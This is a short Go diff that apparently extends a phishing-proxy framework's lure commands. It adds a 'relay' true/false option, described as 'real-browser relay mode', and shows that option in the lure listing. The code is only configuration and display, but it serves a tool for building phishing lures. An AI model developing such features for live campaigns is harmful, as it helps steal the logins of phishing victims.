@@ -295,6 +295,14 @@ func (t *Terminal) handleLures(args []string) error {
 					l.Phishlet = val
 					do_update = true
 					log.Info("phishlet = '%s'", l.Phishlet)
+				case "relay":
+					b, err := strconv.ParseBool(strings.ToLower(val))
+					if err != nil {
+						return fmt.Errorf("edit: relay must be true/false")
+					}
+					l.Relay = b
+					do_update = true
+					log.Info("relay = '%v' (real-browser relay mode)", l.Relay)
 				case "info":
 					l.Info = val
 					do_update = true
@@ -443,8 +451,8 @@ func (t *Terminal) handleLures(args []string) error {
 
 			var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))
 
-			keys := []string{"phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url"}
-			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
+			keys := []string{"phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "paused", "relay", "info", "og_title", "og_desc", "og_image", "og_url"}
+			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, fmt.Sprintf("%v", l.Relay), l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
 			log.Printf("\n%s\n", AsRows(keys, vals))
 
 			return nil
